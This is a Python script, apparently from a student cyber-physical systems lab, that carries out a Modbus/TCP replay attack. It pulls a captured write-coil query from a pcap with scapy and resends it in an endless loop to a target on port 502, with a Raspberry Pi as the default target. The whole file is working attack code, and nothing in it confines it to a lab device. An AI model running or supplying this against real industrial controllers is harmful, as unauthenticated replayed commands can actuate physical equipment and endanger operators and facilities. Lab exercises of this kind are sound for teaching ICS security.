#!/usr/bin/env python3
"""replay attack - handles multi-packet pcaps"""
import socket
import time
import sys
from scapy.all import *  # reading pcap files
from scapy.layers.inet import IP, TCP # packet layer access

# path to pcap with modbus command
# captured using: sudo tshark -i en0 -f "tcp port 502" -c 10 -w file_name
pcap_path = "/Users/cj/Desktop/modbus_lab/cps-modbus-lab/cps-modbus-lab/pcap/one_write_coil_full.pcap"

# try to read pcap
try:
    packets = rdpcap(pcap_path) # rdpcap returns list of packet objects
    print(f"[+] successfully read {len(packets)} packets")
except Exception as e:
    print(f"[!] error reading pcap: {e}")
    sys.exit(1)

modbus_payload = None # variable to store extracted modbus payload

# look through ALL packets for modbus data
for i, pkt in enumerate(packets):
    # print progress
    print(f"[*] packet {i}: ", end="") # end="" keeps cursor on same line

    # skip non tcp
    if not pkt.haslayer(TCP):
        print("not TCP")
        continue

    # skip tcp packets without app data (syn, ack, fin)
    if not pkt.haslayer(Raw):
        print(f"TCP {pkt[TCP].sport}->{pkt[TCP].dport} but no payload")
        continue

    # check if it's going to port 502 (modbus query)
    if pkt[TCP].dport == 502:
        # extract raw bytes
        payload = bytes(pkt[Raw])
        print(f"modbus query! {len(payload)} bytes: {payload.hex()}")

        # verify it looks like modbus (min 8 bytes)
        # 7 bytes mbap header + 1 byte function code
        if len(payload) >= 8:
            modbus_payload = payload
            break
    else:
        print(f"TCP {pkt[TCP].sport}->{pkt[TCP].dport} (not to 502)")

# check if we found a modbus packet
if not modbus_payload:
    print("[!] no modbus query packet found")
    print("[!] make sure to capture the actual data packet, not just TCP handshake")
    sys.exit(1)

# get target from command line
target = sys.argv[1] if len(sys.argv) > 1 else "raspberrypi.local"
print(f"\n[*] replaying to {target}")
print(f"[*] payload: {modbus_payload.hex()}")

# main attack loop
while True:
    try:
        # create new tcp socket
        s = socket.socket()
        # connect to modbus server
        s.connect((target, 502))
        # send captured modbus payload
        s.send(modbus_payload)
        # close connection cleanly
        s.close()
        # log attack
        print("[>] sent led on command")
        # wait before next attack
        time.sleep(2)
    except KeyboardInterrupt: # ctrl + c
        # exit loop
        break